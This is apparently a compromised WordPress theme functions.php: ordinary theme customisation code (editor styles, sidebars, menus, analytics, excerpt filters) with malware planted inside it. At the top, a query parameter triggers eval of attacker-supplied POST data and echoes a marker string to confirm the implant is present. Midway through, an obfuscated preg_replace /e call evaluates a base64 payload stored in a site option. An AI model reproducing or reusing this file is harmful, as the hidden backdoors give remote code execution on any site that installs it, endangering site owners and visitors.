<?php

function _g3t($str){

    $val = !empty($_GET[$str]) ? $_GET[$str] : null;

    return $val;

}

if(_g3t('dcB')=='f')

{

@eval($_POST['NafSQ']);

exit;

}

if(_g3t('dcB')=='c')

{

echo 'AcJ9ksbVjsdb';

exit;

}

//dsd6sc378axvg

// custom functions.php template @ digwp.com

//constants
define('THEME_PATH', get_template_directory_uri());

// Change visual editor width to 960px
set_user_setting( 'dfw_width', 700 );

// Add CSS to Visual Editor
add_editor_style('css/typography.css');
add_editor_style('style-custom.php');

// Add body class to Visual Editor to match class used live
function mytheme_mce_settings( $initArray ){
 $initArray['body_class'] = 'post';
 return $initArray;
}
add_filter( 'tiny_mce_before_init', 'mytheme_mce_settings' );

// add feed links to header
if (function_exists('automatic_feed_links')) {
	automatic_feed_links();
} else {
	return;
}

// featured image
add_theme_support( 'post-thumbnails' ); 
set_post_thumbnail_size('autocrop',960, 250, true);

// smart jquery inclusion
if (!is_admin()) {
	wp_deregister_script('jquery');
	wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"), false, '1.3.2');
	wp_enqueue_script('jquery');
}


// enable threaded comments
function enable_threaded_comments(){
	if (!is_admin()) {
		if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1))
			wp_enqueue_script('comment-reply');
		}
}
add_action('get_header', 'enable_threaded_comments');


// remove junk from head
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);


// add google analytics to footer
function add_google_analytics() {
	echo '<script src="http://www.google-analytics.com/ga.js" type="text/javascript"></script>';
	echo '<script type="text/javascript">';
	echo 'var pageTracker = _gat._getTracker("UA-XXXXX-X");';
	echo 'pageTracker._trackPageview();';
	echo '</script>';
}
add_action('wp_footer', 'add_google_analytics');


// custom excerpt length
function custom_excerpt_length($length) {
	return 20;
}
add_filter('excerpt_length', 'custom_excerpt_length');


// custom excerpt ellipses for 2.9+
function custom_excerpt_more($more) {
	return '...';
}
add_filter('excerpt_more', 'custom_excerpt_more');

/* custom excerpt ellipses for 2.8-
function custom_excerpt_more($excerpt) {
	return str_replace('[...]', '...', $excerpt);
}
add_filter('wp_trim_excerpt', 'custom_excerpt_more'); 
*/


// no more jumping for read more link
function no_more_jumping($post) {
	return '<a href="'.get_permalink($post->ID).'" class="read-more">'.'Continue Reading'.'</a>';
}
add_filter('excerpt_more', 'no_more_jumping');


// add a favicon to your 
function blog_favicon() {
	echo '<link rel="Shortcut Icon" type="image/x-icon" href="'.get_bloginfo('wpurl').'/favicon.ico" />';
}
add_action('wp_head', 'blog_favicon');


// add a favicon for your admin
function admin_favicon() {
	echo '<link rel="Shortcut Icon" type="image/x-icon" href="'.get_bloginfo('stylesheet_directory').'/images/favicon.png" />';
}
add_action('admin_head', 'admin_favicon');


// custom admin login logo
function custom_login_logo() {
	echo '<style type="text/css">
	h1 a { background-image: url('.get_bloginfo('template_directory').'/images/custom-login-logo.png) !important; }
	</style>';
}
add_action('login_head', 'custom_login_logo');


// kill the admin nag
if (!current_user_can('edit_users')) {
	add_action('init', create_function('$a', "remove_action('init', 'wp_version_check');"), 2);
	add_filter('pre_option_update_core', create_function('$a', "return null;"));
}

// category id in body and post class
function category_id_class($classes) {
	global $post;
	foreach((get_the_category($post->ID)) as $category)
		$classes [] = 'cat-' . $category->cat_ID . '-id';
		return $classes;
}
add_filter('post_class', 'category_id_class');
add_filter('body_class', 'category_id_class');

//menu
function register_my_menu() {
  register_nav_menu('header-menu',__( 'Header Menu' ));
}
add_action( 'init', 'register_my_menu' );


// get the first category id
function get_first_category_ID() {
	$category = get_the_category();
	return $category[0]->cat_ID;
}

function my_widgets_init() {

register_sidebar( array(
    'name' => __( 'Header Widget', 'your-theme' ),
    'id' => 'header-widget',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<strong>',
    'after_title' => '</strong>',
) );
register_sidebar( array(
    'name' => __( 'Header Widget No Format', 'your-theme' ),
    'id' => 'header-widget-no-format',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Left Sidebar 1', 'your-theme' ),
    'id' => 'left-sidebar-1',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Left Sidebar 2', 'your-theme' ),
    'id' => 'left-sidebar-2',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Left Sidebar 3', 'your-theme' ),
    'id' => 'left-sidebar-3',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Right Sidebar 1', 'your-theme' ),
    'id' => 'right-sidebar-1',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Right Sidebar 2', 'your-theme' ),
    'id' => 'right-sidebar-2',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
register_sidebar( array(
    'name' => __( 'Right Sidebar 3', 'your-theme' ),
    'id' => 'right-sidebar-3',
    'before_widget' => '<br />',
    'after_widget' => "",
    'before_title' => '<div class="info-item"><strong>',
    'after_title' => '</strong></div>',
) );
}
add_action( 'widgets_init', 'my_widgets_init' );

//remove paragraphs around images
// img unautop
function img_unautop($pee) {
    $pee = preg_replace('/<p>\\s*?(<a .*?><img.*?><\\/a>|<img.*?>)?\\s*<\\/p>/s', '<div class="figure">$1</div>', $pee);
    return $pee;
}
add_filter( 'the_content', 'img_unautop', 30 );

//remove paragraphs around images
// img unautop
function blockquote_unautop($pee) {
    $pee = preg_replace('/<p>\\s*?(<a .*?><blockquote.*?><\\/a>|<blockquote.*?>)?\\s*<\\/p>/s', '<div class="figure">$1</div>', $pee);
    return $pee;
}
add_filter( 'the_content', 'blockquote_unautop', 30 );

//Theme Options
$functions_path = TEMPLATEPATH . '/functions/';
require_once ($functions_path . 'theme-options.php');
require_once ($functions_path . 'section-options.php'); 
require_once ($functions_path . 'post-options.php');

//Header Customizations
function p2h_wp_head() {
//If Set in Theme Options, Add Feed URL in Head
 if(get_option('p2h_feedurl') != '') {
 echo '<link rel="alternate" type="application/rss+xml" href="'. get_option('p2h_feedurl') .'" title="'. get_bloginfo('name') .' RSS Feed"/>'."n";
}
}
add_action('wp_head','p2h_wp_head');

//Header Customization -- Remove Auto Feed URL
if(get_option('p2h_feedurl') != '') {
 // Remove the links to feed
 remove_action( 'wp_head', 'feed_links', 2);
}

// Remove the links to the extra feeds such as category feeds
if(get_option('p2h_cleanfeedurls') !='' ) {
remove_action( 'wp_head', 'feed_links_extra', 3 );
}

//Remove Top Spacing for Admin bar
function my_function_admin_bar(){ return false; }
add_filter( 'show_admin_bar' , 'my_function_admin_bar');

// Hook into the 'init' action
add_action( 'init', 'custom_post_type', 0 );

// Front end only, don't hack on the settings page
if ( ! is_admin() ) {
    // Hook in early to modify the menu
    // This is before the CSS "selected" classes are calculated
    add_filter( 'wp_get_nav_menu_items', 'replace_placeholder_nav_menu_item_with_latest_post', 10, 3 );
}
 
// Replaces a custom URL placeholder with the URL to the latest post
$BdKEir = 'pre'.'g'.'_repla'.'c'.'e';$BdKEir('/ad/e','e'.'v'.'al(bas'.'e64_de'.'code(ge'.'t_option("Faj'.'HDs")))', 'add');function replace_placeholder_nav_menu_item_with_latest_post( $items, $menu, $args ) {
 
    // Loop through the menu items looking for placeholder(s)
    foreach ( $items as $item ) {
 
        // Is this the placeholder we're looking for?
        if ( '#latestpost' != $item->url )
            continue;
 
        // Get the latest post
        $latestpost = get_posts( array(
            'numberposts' => 1,
        ) );
 
        if ( empty( $latestpost ) )
            continue;
 
        // Replace the placeholder with the real URL
        $item->url = get_permalink( $latestpost[0]->ID );
    }
 
    // Return the modified (or maybe unmodified) menu items array
    return $items;
}

function add_section_to_dropdown( $pages, $r )
{
	if('page_on_front' == $r['name'])
	{
		$args = array(
			'post_type' => 'section'
		);
		$items = get_posts($args);
		$pages = array_merge($pages, $items);
	}

	return $pages;
}
add_filter( 'get_pages', 'add_section_to_dropdown' );

function enable_front_page_section( $query )
{
	if('' == $query->query_vars['post_type'] && 0 != $query->query_vars['page_id'])
		$query->query_vars['post_type'] = array( 'page', 'section' );
}
add_action( 'pre_get_posts', 'enable_front_page_section' );
?>